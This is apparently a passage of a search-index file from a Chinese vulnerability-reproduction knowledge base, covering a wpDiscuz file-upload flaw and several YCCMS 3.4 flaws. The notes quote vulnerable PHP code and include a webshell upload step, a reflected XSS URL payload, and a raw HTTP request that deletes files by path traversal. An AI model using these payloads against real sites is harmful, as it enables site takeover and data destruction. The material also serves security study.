wordpress\u8bc4\u8bba\u63d2\u4ef6wpDiscuz\u5bfc\u81f4\u7684\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u6ca1\u6709\u5b89\u88c5wpDiscuz\u63d2\u4ef6\u662f\u6ca1\u6709\u6b64\u6f0f\u6d1e\u7684\u3002 \u5f71\u54cd\u8303\u56f4 wpDiscuz v7.0.0-v7.0.4 \u73af\u5883\u642d\u5efa https://cn.wordpress.org/latest-zh_CN.zip https://downloads.wordpress.org/plugin/wpdiscuz.7.0.3.zip \u7ba1\u7406\u5458\u767b\u5f55\uff0c\u5728\u63d2\u4ef6\u6a21\u5757\u5b89\u88c5wpdiscuz\u63d2\u4ef6\uff0c\u5373\u53ef\u770b\u5230\u8bc4\u8bba\u754c\u9762\u53d8\u6210\u8fd9\u4e2a\u6837\u5b50\uff0c\u70b9\u51fb\u56fe\u7247\u7684\u5c0f\u6807\u53ef\u4e0a\u4f20\u56fe\u7247\u3002 \u4e0a\u4f20\u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u4fee\u6539\u4e3aGTF\u5934 \u8681\u5251\u8fde\u63a5\u6210\u529f","title":"WordPress\u8bc4\u8bba\u63d2\u4ef6wpDiscuz\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#wordpresswpdiscuz","text":"\u6f0f\u6d1e\u63cf\u8ff0 wordpress\u8bc4\u8bba\u63d2\u4ef6wpDiscuz\u5bfc\u81f4\u7684\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u6ca1\u6709\u5b89\u88c5wpDiscuz\u63d2\u4ef6\u662f\u6ca1\u6709\u6b64\u6f0f\u6d1e\u7684\u3002 \u5f71\u54cd\u8303\u56f4 wpDiscuz v7.0.0-v7.0.4 \u73af\u5883\u642d\u5efa https://cn.wordpress.org/latest-zh_CN.zip https://downloads.wordpress.org/plugin/wpdiscuz.7.0.3.zip \u7ba1\u7406\u5458\u767b\u5f55\uff0c\u5728\u63d2\u4ef6\u6a21\u5757\u5b89\u88c5wpdiscuz\u63d2\u4ef6\uff0c\u5373\u53ef\u770b\u5230\u8bc4\u8bba\u754c\u9762\u53d8\u6210\u8fd9\u4e2a\u6837\u5b50\uff0c\u70b9\u51fb\u56fe\u7247\u7684\u5c0f\u6807\u53ef\u4e0a\u4f20\u56fe\u7247\u3002 \u4e0a\u4f20\u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u4fee\u6539\u4e3aGTF\u5934 \u8681\u5251\u8fde\u63a5\u6210\u529f","title":"WordPress\u8bc4\u8bba\u63d2\u4ef6wpDiscuz\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/","text":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd \u00b6 YCCMS 3.4 \u4e09\u3001\u590d\u73b0\u8fc7\u7a0b \u00b6 \u5728\u4e0d\u9700\u8981\u767b\u5f55\u7684\u60c5\u51b5\u4e0a\u4f20\u6210\u529f \u5b9a\u4f4d\u5230\u6f0f\u6d1e\u4f4d\u7f6e\uff1a controller\\CallAction.class.php public function upLoad() { if (isset($_POST['send'])) { $_logoupload = new LogoUpload('pic',$_POST['MAX_FILE_SIZE']); $_path = $_logoupload->getPath(); $_img = new Image($_path); $_img->xhImg(960,0); $_img->out(); //echo $_path; $_logoupload->alertOpenerClose('\u56fe\u7247\u4e0a\u4f20\u6210\u529f\uff01','..'.$_path); } else { exit('\u8b66\u544a\uff1a\u6587\u4ef6\u8fc7\u5927\u6216\u8005\u5176\u4ed6\u672a\u77e5\u9519\u8bef\u5bfc\u81f4\u6d4f\u89c8\u5668\u5d29\u6e83\uff01'); } } \u7136\u540e\u8ddf\u8fdb\u5230\u7c7bLogoUpload ,\u4f4d\u4e8epublic\\class\\LogoUpload.class.php\uff0c\u4e0a\u4f20\u9996\u8981\u5173\u6ce8\u4e0a\u4f20\u662f\u662f\u5426\u5141\u8bb8\u4e0a\u4f20\u975e\u56fe\u7247\u683c\u5f0f\u7684\u6587\u4ef6 private function checkType() { if (!in_array($this->type,$this->typeArr)) { Tool::alertBack('\u8b66\u544a\uff1aLOGO\u56fe\u7247\u5fc5\u987b\u662fPNG\u683c\u5f0f\uff01'); } } private $typeArr = array('image/png','image/x-png');//\u7c7b\u578b\u5408\u96c6 \u6839\u636eContent-Type\u7684\u503c\u6765\u5224\u65ad\u662f\u5426\u662f\u56fe\u7247\u683c\u5f0f\uff0c\u53ea\u8981Content-Type\u662f\u8fd9\u4e24\u79cd\u7c7b\u578b\u5c31\u53ef\u4ee5\uff0c\u90a3\u76f4\u63a5\u4f2a\u9020Content-Type\u5c31\u53ef\u4ee5\u4e86 \u53c2\u8003\u94fe\u63a5 \u00b6 https://xz.aliyun.com/t/7748#toc-4","title":"YCCMS 3.4 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff08\u4e00\uff09"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/#_1","text":"","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/#_2","text":"YCCMS 3.4","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/#_3","text":"\u5728\u4e0d\u9700\u8981\u767b\u5f55\u7684\u60c5\u51b5\u4e0a\u4f20\u6210\u529f \u5b9a\u4f4d\u5230\u6f0f\u6d1e\u4f4d\u7f6e\uff1a controller\\CallAction.class.php public function upLoad() { if (isset($_POST['send'])) { $_logoupload = new LogoUpload('pic',$_POST['MAX_FILE_SIZE']); $_path = $_logoupload->getPath(); $_img = new Image($_path); $_img->xhImg(960,0); $_img->out(); //echo $_path; $_logoupload->alertOpenerClose('\u56fe\u7247\u4e0a\u4f20\u6210\u529f\uff01','..'.$_path); } else { exit('\u8b66\u544a\uff1a\u6587\u4ef6\u8fc7\u5927\u6216\u8005\u5176\u4ed6\u672a\u77e5\u9519\u8bef\u5bfc\u81f4\u6d4f\u89c8\u5668\u5d29\u6e83\uff01'); } } \u7136\u540e\u8ddf\u8fdb\u5230\u7c7bLogoUpload ,\u4f4d\u4e8epublic\\class\\LogoUpload.class.php\uff0c\u4e0a\u4f20\u9996\u8981\u5173\u6ce8\u4e0a\u4f20\u662f\u662f\u5426\u5141\u8bb8\u4e0a\u4f20\u975e\u56fe\u7247\u683c\u5f0f\u7684\u6587\u4ef6 private function checkType() { if (!in_array($this->type,$this->typeArr)) { Tool::alertBack('\u8b66\u544a\uff1aLOGO\u56fe\u7247\u5fc5\u987b\u662fPNG\u683c\u5f0f\uff01'); } } private $typeArr = array('image/png','image/x-png');//\u7c7b\u578b\u5408\u96c6 \u6839\u636eContent-Type\u7684\u503c\u6765\u5224\u65ad\u662f\u5426\u662f\u56fe\u7247\u683c\u5f0f\uff0c\u53ea\u8981Content-Type\u662f\u8fd9\u4e24\u79cd\u7c7b\u578b\u5c31\u53ef\u4ee5\uff0c\u90a3\u76f4\u63a5\u4f2a\u9020Content-Type\u5c31\u53ef\u4ee5\u4e86","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/#_4","text":"https://xz.aliyun.com/t/7748#toc-4","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/","text":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd \u00b6 YCCMS 3.4 \u4e09\u3001\u590d\u73b0\u8fc7\u7a0b \u00b6 \u5728\u4e0d\u9700\u8981\u767b\u5f55\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u4e0a\u4f20\u6210\u529f\uff0c\u4e0a\u4f20\u5730\u5740\u4e3aE:/phpstudy/WWW/yccms/uploads/20200509133351770.php \u5b9a\u4f4d\u6f0f\u6d1e\u4f4d\u7f6e\u4e3acontroller\\CallAction.class.php\u4e2d\u7684xhUp\u51fd\u6570 public function xhUp() { if (isset($_GET['type'])) { $_fileupload = new FileUpload('filedata',10); $_err=$_fileupload->checkError(); $_path = $_fileupload->getPath(); $_msg=\"'..$_path'\"; $_img = new Image($_path); $_img->xhImg(650,0); $_img->out(); echo \"{'err':'\".$_err.\"','msg':\".$_msg.\"}\"; exit(); } else { Tool::alertBack('\u8b66\u544a\uff1a\u7531\u4e8e\u975e\u6cd5\u64cd\u4f5c\u5bfc\u81f4\u4e0a\u4f20\u5931\u8d25\uff01'); } } \u8ddf\u8fdb\u5230\u7c7bFileUpload\uff0c \u4f4d\u4e8epublic\\class\\FileUpload.class.php\uff0c\u7136\u540e\u770b\u5230\u540c\u6837\u4e5f\u662f\u68c0\u67e5\u7684\u4f20\u5165\u7684Content-Type\u7684\u503c private function checkType() { if (!in_array($this->type,$this->typeArr)) { Tool::alertBack('\u8b66\u544a\uff1a\u4e0d\u5408\u6cd5\u7684\u4e0a\u4f20\u7c7b\u578b\uff01'); } } private $typeArr = array('image/jpeg','image/pjpeg','image/png','image/x-png','image/gif'); \u53c2\u8003\u94fe\u63a5 \u00b6 https://xz.aliyun.com/t/7748#toc-4","title":"YCCMS 3.4 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff08\u4e8c\uff09"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/#_1","text":"","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/#_2","text":"YCCMS 3.4","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/#_3","text":"\u5728\u4e0d\u9700\u8981\u767b\u5f55\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u4e0a\u4f20\u6210\u529f\uff0c\u4e0a\u4f20\u5730\u5740\u4e3aE:/phpstudy/WWW/yccms/uploads/20200509133351770.php \u5b9a\u4f4d\u6f0f\u6d1e\u4f4d\u7f6e\u4e3acontroller\\CallAction.class.php\u4e2d\u7684xhUp\u51fd\u6570 public function xhUp() { if (isset($_GET['type'])) { $_fileupload = new FileUpload('filedata',10); $_err=$_fileupload->checkError(); $_path = $_fileupload->getPath(); $_msg=\"'..$_path'\"; $_img = new Image($_path); $_img->xhImg(650,0); $_img->out(); echo \"{'err':'\".$_err.\"','msg':\".$_msg.\"}\"; exit(); } else { Tool::alertBack('\u8b66\u544a\uff1a\u7531\u4e8e\u975e\u6cd5\u64cd\u4f5c\u5bfc\u81f4\u4e0a\u4f20\u5931\u8d25\uff01'); } } \u8ddf\u8fdb\u5230\u7c7bFileUpload\uff0c \u4f4d\u4e8epublic\\class\\FileUpload.class.php\uff0c\u7136\u540e\u770b\u5230\u540c\u6837\u4e5f\u662f\u68c0\u67e5\u7684\u4f20\u5165\u7684Content-Type\u7684\u503c private function checkType() { if (!in_array($this->type,$this->typeArr)) { Tool::alertBack('\u8b66\u544a\uff1a\u4e0d\u5408\u6cd5\u7684\u4e0a\u4f20\u7c7b\u578b\uff01'); } } private $typeArr = array('image/jpeg','image/pjpeg','image/png','image/x-png','image/gif');","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/#_4","text":"https://xz.aliyun.com/t/7748#toc-4","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/","text":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd \u00b6 YCCMS 3.4 \u4e09\u3001\u590d\u73b0\u8fc7\u7a0b \u00b6 https://www.0-baize.org/admin/?a=html&art=<sCrIpT>alert(ian)<%2FsCrIpT>&m=arts","title":"YCCMS 3.4 \u53cd\u5c04\u578bxss"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#_1","text":"","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#_2","text":"YCCMS 3.4","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#_3","text":"https://www.0-baize.org/admin/?a=html&art=<sCrIpT>alert(ian)<%2FsCrIpT>&m=arts","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9B%B4%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/","text":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd \u00b6 YCCMS 3.4 \u4e09\u3001\u590d\u73b0\u8fc7\u7a0b \u00b6 \u9996\u5148\u6765\u770b\u4e00\u4e0b\u6f0f\u6d1e\u5229\u7528\u8fc7\u7a0b\uff0c\u5728\u672a\u767b\u5f55\u7684\u60c5\u51b5\u4e0b\u6784\u9020url,\u53ea\u9700\u8981\u66f4\u6539username password notpassword\u7684\u503c\u5373\u53ef\u66f4\u6539\u6570\u636e\u5e93\u4e2dadmin\u8d26\u53f7\u7684\u76f8\u5173\u4fe1\u606f \u53bb\u6570\u636e\u5e93\u4e2d\u67e5\u770b\u53d1\u73b0\u5df2\u7ecf\u66f4\u6539\u4e86\u8d26\u53f7\u5bc6\u7801 \u6839\u636eurl\u6765\u5b9a\u4f4d\u4e00\u4e0b\u6f0f\u6d1e\u51fd\u6570\uff0c\u51fd\u6570\u4f4d\u4e8econtroller\\AdminAction.class.php\u4e2d\u7684update\u51fd\u6570 public function update(){ if(isset($_POST['send'])){ if(validate::isNullString($_POST['username'])) Tool::t_back('\u7528\u6237\u540d\u4e0d\u80fd\u4e3a\u7a7a','?a=admin&m=update'); if(validate::isNullString($_POST['password'])) Tool::t_back('\u5bc6\u7801\u4e0d\u80fd\u4e3a\u7a7a!','?a=admin&m=update'); if(!(validate::checkStrEquals($_POST['password'], $_POST['notpassword']))) Tool::t_back('\u4e24\u6b21\u5bc6\u7801\u4e0d\u4e00\u81f4!','?a=admin&m=update'); $this->_model->username=$_POST['username']; $this->_model->password=sha1($_POST['password']); $_edit=$this->_model->editAdmin(); if($_edit){ tool::layer_alert('\u5bc6\u7801\u4fee\u6539\u6210\u529f!','?a=admin&m=update',6); }else{ tool::layer_alert('\u5bc6\u7801\u672a\u4fee\u6539!','?a=admin&m=update',6); } } $this->_tpl->assign('admin', $_SESSION['admin']); $this->_tpl->display('admin/public/update.tpl'); } \u53ef\u4ee5\u770b\u5230\u524d\u9762\u90fd\u662f\u4e00\u4e9b\u5224\u65ad\uff0c\u91cd\u70b9\u5173\u6ce8\u4e0beditAdmin()\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u4f4d\u4e8emodel\\AdminModel.class.php public function editAdmin(){ $_sql=\"UPDATE my_admin SET username='$this->username', password='$this->password' WHERE id=1 LIMIT 1\"; return parent::update($_sql); } \u8be5\u51fd\u6570\u7684\u7236\u7c7b\u4e3aModel, \u4f4d\u4e8emodel\\Model.class.php\uff0c\u770b\u4e00\u4e0bupdate\u51fd\u6570 protected function update($_sql){ return $this->execute($_sql)->rowCount(); } \u8c03\u7528execute\u51fd\u6570\u53bb\u6267\u884csql\u8bed\u53e5 protected function execute($_sql){ try{ $_stmt=$this->_db->prepare($_sql); $_stmt->execute(); }catch (PDOException $e){ exit('SQL\u8bed\u53e5:'.$_sql.'<br />\u9519\u8bef\u4fe1\u606f:'.$e->getMessage()); } return $_stmt; } } \u8fd9\u4e00\u7cfb\u5217\u7684\u64cd\u4f5c\u4e3b\u8981\u662f\u7528\u6765\u751f\u6210SQL\u8bed\u53e5\u7136\u540e\u6267\u884cSQL\u8bed\u53e5\uff0ceditAdmin\u51fd\u6570\u76f4\u63a5\u628a\u4f20\u8fdb\u6765\u7684username password\u62fc\u63a5\u5230sql\u8bed\u53e5\u4e2d\uff0c\u7136\u540e\u53bb\u66f4\u65b0\u76f8\u5173\u8868\u4e2did=1\u7684\u6570\u636e\uff0c\u8fd9\u4e5f\u5c31\u9020\u6210\u4e86\u4efb\u610f\u66f4\u6539\u7ba1\u7406\u5458\u8d26\u53f7\u5bc6\u7801 \u53c2\u8003\u94fe\u63a5 \u00b6 https://xz.aliyun.com/t/7748#toc-2","title":"YCCMS 3.4 \u672a\u6388\u6743\u66f4\u6539\u7ba1\u7406\u5458\u8d26\u53f7\u5bc6\u7801"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9B%B4%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/#_1","text":"","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9B%B4%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/#_2","text":"YCCMS 3.4","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9B%B4%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/#_3","text":"\u9996\u5148\u6765\u770b\u4e00\u4e0b\u6f0f\u6d1e\u5229\u7528\u8fc7\u7a0b\uff0c\u5728\u672a\u767b\u5f55\u7684\u60c5\u51b5\u4e0b\u6784\u9020url,\u53ea\u9700\u8981\u66f4\u6539username password notpassword\u7684\u503c\u5373\u53ef\u66f4\u6539\u6570\u636e\u5e93\u4e2dadmin\u8d26\u53f7\u7684\u76f8\u5173\u4fe1\u606f \u53bb\u6570\u636e\u5e93\u4e2d\u67e5\u770b\u53d1\u73b0\u5df2\u7ecf\u66f4\u6539\u4e86\u8d26\u53f7\u5bc6\u7801 \u6839\u636eurl\u6765\u5b9a\u4f4d\u4e00\u4e0b\u6f0f\u6d1e\u51fd\u6570\uff0c\u51fd\u6570\u4f4d\u4e8econtroller\\AdminAction.class.php\u4e2d\u7684update\u51fd\u6570 public function update(){ if(isset($_POST['send'])){ if(validate::isNullString($_POST['username'])) Tool::t_back('\u7528\u6237\u540d\u4e0d\u80fd\u4e3a\u7a7a','?a=admin&m=update'); if(validate::isNullString($_POST['password'])) Tool::t_back('\u5bc6\u7801\u4e0d\u80fd\u4e3a\u7a7a!','?a=admin&m=update'); if(!(validate::checkStrEquals($_POST['password'], $_POST['notpassword']))) Tool::t_back('\u4e24\u6b21\u5bc6\u7801\u4e0d\u4e00\u81f4!','?a=admin&m=update'); $this->_model->username=$_POST['username']; $this->_model->password=sha1($_POST['password']); $_edit=$this->_model->editAdmin(); if($_edit){ tool::layer_alert('\u5bc6\u7801\u4fee\u6539\u6210\u529f!','?a=admin&m=update',6); }else{ tool::layer_alert('\u5bc6\u7801\u672a\u4fee\u6539!','?a=admin&m=update',6); } } $this->_tpl->assign('admin', $_SESSION['admin']); $this->_tpl->display('admin/public/update.tpl'); } \u53ef\u4ee5\u770b\u5230\u524d\u9762\u90fd\u662f\u4e00\u4e9b\u5224\u65ad\uff0c\u91cd\u70b9\u5173\u6ce8\u4e0beditAdmin()\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u4f4d\u4e8emodel\\AdminModel.class.php public function editAdmin(){ $_sql=\"UPDATE my_admin SET username='$this->username', password='$this->password' WHERE id=1 LIMIT 1\"; return parent::update($_sql); } \u8be5\u51fd\u6570\u7684\u7236\u7c7b\u4e3aModel, \u4f4d\u4e8emodel\\Model.class.php\uff0c\u770b\u4e00\u4e0bupdate\u51fd\u6570 protected function update($_sql){ return $this->execute($_sql)->rowCount(); } \u8c03\u7528execute\u51fd\u6570\u53bb\u6267\u884csql\u8bed\u53e5 protected function execute($_sql){ try{ $_stmt=$this->_db->prepare($_sql); $_stmt->execute(); }catch (PDOException $e){ exit('SQL\u8bed\u53e5:'.$_sql.'<br />\u9519\u8bef\u4fe1\u606f:'.$e->getMessage()); } return $_stmt; } } \u8fd9\u4e00\u7cfb\u5217\u7684\u64cd\u4f5c\u4e3b\u8981\u662f\u7528\u6765\u751f\u6210SQL\u8bed\u53e5\u7136\u540e\u6267\u884cSQL\u8bed\u53e5\uff0ceditAdmin\u51fd\u6570\u76f4\u63a5\u628a\u4f20\u8fdb\u6765\u7684username password\u62fc\u63a5\u5230sql\u8bed\u53e5\u4e2d\uff0c\u7136\u540e\u53bb\u66f4\u65b0\u76f8\u5173\u8868\u4e2did=1\u7684\u6570\u636e\uff0c\u8fd9\u4e5f\u5c31\u9020\u6210\u4e86\u4efb\u610f\u66f4\u6539\u7ba1\u7406\u5458\u8d26\u53f7\u5bc6\u7801","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9B%B4%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/#_4","text":"https://xz.aliyun.com/t/7748#toc-2","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/","text":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd \u00b6 YCCMS 3.4 \u4e09\u3001\u590d\u73b0\u8fc7\u7a0b \u00b6 POST /admin/?a=pic&m=delall HTTP/1.1 Host: 127.0.0.1:8082 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 89 Origin: http://127.0.0.1:8082 Connection: close Referer: http://127.0.0.1:8082/admin/?a=pic Upgrade-Insecure-Requests: 1 pid%5B0%5D=../1.txt&chkall=on&send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87t \u53ea\u9700\u8981\u66f4\u6539pid[0]\u5373\u53ef\u5728\u65e0\u767b\u5f55\u6761\u4ef6\u4e0b\u4efb\u610f\u5220\u9664\u6587\u4ef6\uff0c\u5220\u9664\u6839\u76ee\u5f55\u4e0b\u76841.txt \u5df2\u7ecf\u5220\u9664\u6210\u529f\u4e86 \u5176\u5b9e\u8fd9\u8fd8\u662f\u72af\u4e86\u4e00\u4e2a\u6700\u5bb9\u6613\u72af\u7684\u9519\u8bef\uff0c\u6ca1\u6709\u5bf9\u4f20\u8fdb\u6765\u7684\u8def\u5f84\u8fdb\u884c\u8fc7\u6ee4\u5c31\u62fc\u63a5\u4e86\u76ee\u5f55\uff0c\u5bfc\u81f4\u4e86\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\u7684\u4ea7\u751f \u6839\u636eurl\u5b9a\u4f4d\u5230\u76f8\u5173\u51fd\u6570\u4f4d\u7f6e,\u4f4d\u4e8e/controller/PicAction.class.php public function delall(){ if(isset($_POST['send'])){ if(validate::isNullString($_POST['pid'])) tool::layer_alert('\u6ca1\u6709\u9009\u62e9\u4efb\u4f55\u56fe\u7247!','?a=pic',7); $_fileDir=ROOT_PATH.'/uploads/'; foreach($_POST['pid'] as $_value){ $_filePath=$_fileDir.$_value; if(!unlink($_filePath)){ tool::layer_alert('\u56fe\u7247\u5220\u9664\u5931\u8d25,\u8bf7\u8bbe\u6743\u9650\u4e3a777!','?a=pic',7); }else{ header('Location:?a=pic'); } } } } \u5bf9 pid\u4f20\u8fdb\u6765\u7684\u503c\u5e76\u6ca1\u6709\u8fdb\u884c\u8fc7\u6ee4\u5c31\u8fdb\u884c\u4e86\u4e86\u8def\u5f84\u7684\u62fc\u63a5\uff0c\u5bfc\u81f4\u4e86\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e\uff0c\u89e6\u53d1\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e \u53c2\u8003\u94fe\u63a5 \u00b6 https://xz.aliyun.com/t/7748#toc-4","title":"YCCMS3.4\u4efb\u610f\u6587\u4ef6\u5220\u9664"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_1","text":"","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_2","text":"YCCMS 3.4","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_3","text":"POST /admin/?a=pic&m=delall HTTP/1.1 Host: 127.0.0.1:8082 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 89 Origin: http://127.0.0.1:8082 Connection: close Referer: http://127.0.0.1:8082/admin/?a=pic Upgrade-Insecure-Requests: 1 